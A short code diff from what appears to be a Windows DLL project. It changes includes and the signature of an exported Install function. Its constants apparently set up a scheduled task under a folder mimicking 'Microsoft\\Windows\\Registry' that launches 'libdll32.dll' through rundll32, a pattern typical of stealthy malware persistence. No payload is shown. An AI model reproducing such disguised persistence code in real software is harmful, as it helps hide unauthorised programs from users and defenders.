@@ -1,4 +1,5 @@
-#include "definition.h"
+#include "errorLog.h"
+#include <taskschd.h>
 
 #define TASK_FOLDER_NAME L"Microsoft\\Windows\\Registry"
 #define RUNDLL32PATH L"System32\\rundll32.exe"
@@ -8,7 +9,7 @@
 #define FILE_NAME L"libdll32.dll"
 #define FUNCTION_NAME L"Execute"
 
-EXPORT(Install) {
+__declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LPSTR argument, int command) {
 	HRESULT result = CoInitializeEx(NULL, COINIT_MULTITHREADED);
 
 	if(FAILED(result)) {
